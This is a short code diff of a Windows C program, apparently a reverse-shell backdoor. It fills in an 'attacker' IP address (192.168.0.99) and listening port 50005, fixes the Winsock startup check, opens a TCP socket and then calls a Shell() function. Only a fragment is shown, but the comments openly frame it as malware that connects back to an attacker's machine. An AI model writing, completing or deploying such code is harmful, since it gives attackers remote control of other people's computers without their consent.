@@ -58,13 +58,13 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	char *ServIP;
 	WSADATA wsaData;
 
-	ServIP = "INSERT SERVER IP ADDRESS"; // IP address from attacker (ifconfig - inet)
-	ServPort = 50005;					 // Listening port
+	ServIP = "192.168.0.99"; // IP address from attacker (ifconfig - inet)
+	ServPort = 50005;		 // Listening port
 
-	if ((WSAStartup(MAKEWORD(2, 0), &wsaData))) != 0)
-		{
-			exit(1);
-		}
+	if ((WSAStartup(MAKEWORD(2, 0), &wsaData)) != 0)
+	{
+		exit(1);
+	}
 
 	sock = socket(AF_INET, SOCK_STREAM, 0);
 
@@ -85,6 +85,4 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 		}
 	}
 	Shell();
-
-	return 0;
 }
